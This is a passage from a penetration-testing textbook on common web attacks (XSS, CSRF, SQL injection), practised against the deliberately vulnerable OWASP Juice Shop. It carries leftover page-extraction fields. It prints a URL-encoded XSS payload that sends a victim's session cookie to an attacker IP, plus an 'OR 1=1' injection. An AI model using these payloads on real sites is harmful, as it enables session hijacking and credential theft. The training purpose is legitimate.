    # COMMON ATTACKS ON WEB APPLICATIONS


    This section details some very common attacks on web applications, how to find
    them, and how to exploit them as well. Keep in mind that we need to make sure
    we can properly weaponize the weaknesses we find to stay effective with our target.


    To practice these attacks and understand how they work, we can use an intentionally
    vulnerable application that is well-documented on how to achieve these results.
    One example of this is the **OWASP Juice Shop**, which is an Angular-based and
    highly interactive JavaScript application. This emulates a modern online webstore
    and some of the most common vulnerabilities which exist within them. The OWASP
    Juice Shop is available at https://owasp.org/www-project-juice-shop/. There are
    several instructions available on how to set up the Juice Shop, including running
    it as a docker container.


    # REFLECTED XSS


    This was a section we covered briefly when talking about our methodology. It’s
    important to understand that XSS should not simply be dismissed, especially depending
    on where it can be found. In one instance, this author identified an XSS bug on
    a payment card page, allowing attackers to gain access to credit card data as
    it was entered into the system. This was a significant finding reported to the
    customer to outline the severity of the finding.


    Reflected XSS occurs when a parameter is passed to the application which is insecurely
    interpreted by the website. This allows the page to be modified to run things
    such as additional JavaScript code. It is referred to as reflected since the information
    needs to be passed to the application for the vulnerability to be exploited. Reflected
    XSS relies on a certain amount of user interaction as well, since the exploit
    payload needs to be passed to the application to be triggered.


    To find an XSS vulnerability, in many cases researchers will use the JavaScript
    alert function to create a clear and present box on top of the window. When the
    exploit is launched and executed properly, the window pauses while the alert box
    is presented to the user. This presents a clear and unmistakable indication of
    a properly executed XSS payload. While using the **alert** function is great to
    show XSS exists, we need to create an impact with our findings to prove that they
    can be used to cause harm. This is why our methodology is so heavily focused on
    weaponization.


    In the case of the Juice Shop, there is a vulnerable parameter on a search page
    that can be used to leverage a reflected XSS attack. Pay attention to the URL
    in the application, because it contains the exploit which is interpreted by the
    application to launch the attack. Without the exploit in the URL, the attack would
    not be successful.'
  merge: -1
  img_proc: true
- pgno: 104
  md: '![](img/181571ad74cba0e6a2f38fcd2658651e_104_0.png)


    **FIGURE 3.46** Successful reflected XSS on the search page. Note that the exploit
    must be placed in the URL, without it the exploit would not fire.


    Now that we have found a vulnerability, we need to identify the exploitability.
    Next, we can attempt to gather the cookies on the page. The cookies can be accessed
    through the DOM with the property **document.cookie** and see if we can access
    it. Note that one of the cookies found is labeled as **token**, which appears
    to be a JavaScript Web Token (JWT) used to help manage sessions.


    ![](img/181571ad74cba0e6a2f38fcd2658651e_104_1.png)


    **FIGURE 3.47** Accessing cookies with the reflected XSS, one cookie shows the
    JavaScript Web Token available.


    Taking this value of the JWT we can place it into programs that help parse the
    token into readable information. One such tool is the JSON Web Tokens Burp Extension,
    which will decode and present the information for a token within Burp. After decoding
    the token, we can see that it contains a lot of sensitive information about the
    current user account, including the user’s password hash.'
  merge: -1
  img_proc: true
- pgno: 105
  md: '![](img/181571ad74cba0e6a2f38fcd2658651e_105_0.png)


    **FIGURE 3.48** Decoding the JWT reveals that the password hash is stored with
    the token which can be accessed via XSS.


    Knowing this information, we can put together an attack where we get a user to
    click on a malicious link where the XSS executes a cookie-stealing attack to exfiltrate
    the cookie to an attacker-controlled domain. Once we have the cookie value, we
    can decode it and attempt to crack the user’s password to gain access to their
    plaintext account. Furthermore, we can always simply replace our JWT with the
    exfiltrated one to take over their current session.


    Stealing the cookie can be achieved by attempting to load a resource from our
    attacker IP with the **document.cookie** appended to it. Our payload would look
    like something similar to the below:


    ```

    http://localhost:3000/#/search?q=%3Cimg%20src%3Dx%20onerror%3Dthis.src%3D

    %22http:%2F%2F192.168.40.97:8081%2F%3F%3D%22%20document.cookie

    ```


    In a real-world scenario, this author has seen a login page that presented an
    “error” parameter in the GET request to display an error to the user. The intent
    of this was to give the user a redirect on a bad credential attempt which would
    display in the document as a clear error. However, manipulating the error parameter
    showed that it was vulnerable to Reflected XSS. To demonstrate the risk and impact
    of this vulnerability, a payload was created that modified the page to add a POST
    location when the submit button was hit. This allowed the credentials to be stolen
    while simultaneously allowing a legitimate login into the application, where the
    user would be none the wiser.


    In the case of a Credit Card transaction, a reflected XSS payload could be used
    to send the card to its intended location as well as an attacker’s controlled
    infrastructure as well. The Magecart'
  merge: -1
  img_proc: true
- pgno: 106
  md: 'group completed a similar set of attacks against vulnerable e-commerce websites
    to contribute to the almost 70 million credit cards for sale in 2020.⁵


    Remember, reflected XSS is categorized and only triggered by a specific payload
    that must be presented to the web application. This limits the exploitability
    of the vulnerability because it relies on user interaction.


    # Stored XSS


    Stored XSS can be found in very similar ways to reflected XSS, but its key difference
    is that we no longer rely on a user’s action to launch the exploit. Stored XSS
    sits in the exploited location and waits until an unsuspecting user loads the
    page. This is commonly found in locations such as forum postings, job postings,
    and blog comments. Once the user browses to an affected webpage, the XSS payload
    will launch within their browser.


    We can launch the same type of XSS against the website as well as get creative
    with the type of JavaScript code we will run. In the event of stealing cookies,
    we will need to identify a way to quickly utilize the cookies before they expire
    or are revoked. Since there is no requirement for user action to occur, we may
    not have a good idea of when the exploits will launch.


    For these reasons, stored XSS is considered a much higher vulnerability with a
    bigger impact than reflected XSS. The amount of users who could be affected by
    this vulnerability is significantly higher than a reflected attack, simply because
    it does not require user interaction.


    # CSRF


    Cross-Site Request Forgery is an attack where users are forced into completing
    an unwanted action. For example, imagine in our web app that an attacker understands
    the exact POST request that is used to change a user’s password associated with
    their account. If this attacker could create a page that would force users to
    send that exact POST request, they could convince a legitimate user to click on
    the link which would execute the attack.


    ![](img/181571ad74cba0e6a2f38fcd2658651e_106_0.png)


    **FIGURE 3.49** CSRF attack where a user’s password is changed without their consent.'
  merge: -1
  img_proc: true
- pgno: 107
  md: 'Without some type of authentication token required by the application, there
    is a high likelihood that the attack would be successful. The impact from an attack
    like this would be a loss of the account’s legitimate owner, and access to the
    account from the attacker’s perspective.


    Burp Suite Pro has an excellent CSRF POC generation tool where testers can quickly
    show the impacts of non-existent CSRF protections.


    # SQLi


    SQL Injection (SQLi) is a very common exploit where attackers modify the SQL statement
    that is sent to the backend SQL database. By modifying the query, attackers can
    gather additional records, passwords, and potentially financial data. SQLi is
    a high-risk item that can cause serious issues for websites if they are not effectively
    mitigated.


    For example, imagine that the SQL statement below is used when checking if a password
    matches the password in the database:


    ```

    SELECT username, password FROM users WHERE username =

    "$_POST[''username'']";

    ```


    By simply adding a "''" to the end of the password, we change how the SQL statement
    is interpreted. Concatenating directly from user input allows the user to change
    the query sent to the database. Now we can modify the rest of this query to see
    what additional actions we may be able to take. For instance, the classic **OR
    1=1 --** is commonly used. Effectively, adding this to the end of the injection
    says “*It doesn’t matter if the password is incorrect, because I will always be
    equal to 1 – so let me in!*”.


    SQLmap is a well-known tool that can be used to automate a large amount of SQL
    attacks on a website. It also gives us a huge amount of flexibility with regard
    to data exfiltration and capture. There are even capabilities to try and get a
    full shell on the host through SQLi alone!


    ![](img/181571ad74cba0e6a2f38fcd2658651e_107_0.png)


    **FIGURE 3.50** Running SQLMap against a vulnerable server, the database type
    detected is SQLite.


    Keep in mind, however, that SQLmap is a *very* loud tool, as it creates thousands
    and thousands of requests over a very short period. This creates a significant
    amount of logs for the target, and'
